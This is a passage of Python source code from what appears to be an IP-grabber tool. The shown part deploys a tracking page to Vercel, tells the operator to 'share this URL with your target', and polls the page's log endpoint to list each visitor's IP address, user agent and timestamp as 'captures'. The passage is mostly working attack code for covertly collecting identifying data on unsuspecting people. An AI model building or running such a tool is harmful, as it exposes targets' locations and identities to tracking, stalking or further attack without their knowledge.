                
                if alias_match:
                    public_url = alias_match.group(1)
                elif url_match:
                    public_url = url_match.group(0)
                else:
                    public_url = None
                
                if public_url:
                    print(f"{Colors.CYAN}Public URL: {Colors.YELLOW}{public_url}{Colors.RESET}")
                    print(f"{Colors.GREEN}Share this URL with your target!{Colors.RESET}")
                    print(f"\n{Fore.GREEN}Starting live monitor...{Fore.RESET}")
                    print(f"{Colors.AMBER}Press Ctrl+C to stop monitoring{Colors.RESET}\n")
                    time.sleep(1)
                    monitor_vercel_logs(public_url)
                else:
                    print(f"{Colors.AMBER}Deployment succeeded but URL not detected. Check Vercel dashboard.{Colors.RESET}")
            else:
                print(f"{Colors.RED}Deployment failed:{Colors.RESET}")
                print(result.stderr)
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Vercel CLI not found. Install with: npm i -g vercel{Colors.RESET}")
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}[!] Deployment timed out.{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Deployment error: {e}{Colors.RESET}")
        
        input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")

def monitor_vercel_logs(public_url):
    """Polls Vercel logs endpoint for captured IPs."""
    logs_url = public_url.rstrip('/') + '/api/logs'
    print(f"\n{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} MONITORING VERCEl LOGS {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
    print(f"{Fore.YELLOW}{public_url}{Fore.RESET}")
    print(f"{Fore.CYAN}Logs URL: {Fore.YELLOW}{logs_url}{Fore.RESET}")
    print(f"{Fore.GREEN}Press Enter to stop...{Fore.RESET}\n")
    
    seen_ips = set()
    last_count = 0
    
    try:
        while True:
            try:
                import urllib.request
                req = urllib.request.Request(logs_url, headers={'User-Agent': 'Mainframe-Monitor'})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    logs = json.loads(resp.read().decode('utf-8'))
                
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} MONITORING VERCEl LOGS {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
                print(f"{Fore.YELLOW}{public_url}{Fore.RESET}")
                print(f"{Fore.CYAN}Logs URL: {Fore.YELLOW}{logs_url}{Fore.RESET}")
                print(f"{Fore.GREEN}Press Enter to stop...{Fore.RESET}\n")
                print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
                print(f"{Style.BRIGHT}{Fore.WHITE}{'TIMESTAMP':<25} {'IP ADDRESS':<20} {'USER AGENT':<35}{Fore.RESET}{Style.RESET_ALL}")
                print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
                
                new_logs = []
                for log in logs:
                    ip = log.get('ip', 'unknown')
                    if ip not in seen_ips:
                        seen_ips.add(ip)
                        new_logs.append(log)
                        ua = log.get('userAgent', log.get('user_agent', 'Unknown'))
                        ua = (ua[:32] + '...') if len(ua) > 35 else ua
                        ts = log.get('timestamp', 'N/A')
                        print(f"{Fore.WHITE}{ts:<25} {Fore.GREEN}{ip:<20} {Fore.CYAN}{ua:<35}{Fore.RESET}")
                
                if new_logs:
                    print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
                    print(f"{Fore.YELLOW}New captures: {len(new_logs)} | Total: {len(logs)}{Fore.RESET}\n")
                elif not logs:
                    print(f"{Colors.AMBER}Waiting for captures...{Colors.RESET}\n")
                    
                last_count = len(logs)
                
            except Exception as e:
                print(f"{Fore.RED}Monitor error: {e}{Fore.RESET}")
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
